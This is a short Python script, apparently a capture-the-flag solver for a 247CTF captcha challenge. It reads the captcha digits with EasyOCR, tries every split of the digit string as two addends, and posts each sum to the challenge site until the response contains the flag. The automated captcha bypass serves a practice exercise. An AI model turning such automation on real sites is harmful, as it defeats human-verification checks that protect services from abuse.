#!/usr/bin/env python3
import easyocr
import cv2

print("Inicializando EasyOCR...")
reader = easyocr.Reader(['en'], gpu=False, verbose=False)

img = cv2.imread('/workspace/thresh_130.png', cv2.IMREAD_GRAYSCALE)

# EasyOCR con detalles
result = reader.readtext(img, allowlist='0123456789+=')

print("Resultados ORDENADOS por posición X:\n")

# Ordenar por posición X (primera coordenada del bbox)
sorted_result = sorted(result, key=lambda x: x[0][0][0])

for i, (bbox, text, conf) in enumerate(sorted_result):
    x_pos = bbox[0][0]
    print(f"{i+1}. X={x_pos:6.1f}: '{text}' (conf: {conf:.2f})")

# Texto ordenado
ordered_text = ''.join([text for (_, text, _) in sorted_result])
print(f"\nTexto ordenado por posición: '{ordered_text}'")

# Probar este nuevo orden
import requests
BASE_URL = "https://087ba594e710a16e.247ctf.com/"

number_str = ordered_text.replace('+', '').replace('=', '')

print(f"\nNúmeros en orden: {number_str}")
print(f"Probando divisiones...\n")

for split in range(1, len(number_str)):
    a_str = number_str[:split]
    b_str = number_str[split:]
    
    if a_str and b_str:
        a = int(a_str)
        b = int(b_str)
        result_calc = a + b
        
        test_session = requests.Session()
        test_session.get(BASE_URL)
        test_session.get(BASE_URL + "mturk.php")
        
        data = {"captcha": str(result_calc)}
        response = test_session.post(BASE_URL, data=data)
        
        if "invalid" not in response.text.lower():
            print(f"✓✓✓ {a} + {b} = {result_calc}")
            
            if "flag" in response.text.lower():
                import re
                flag_match = re.search(r'247CTF\{[^}]+\}', response.text, re.IGNORECASE)
                if flag_match:
                    print(f"\n{flag_match.group(0)}")
            break
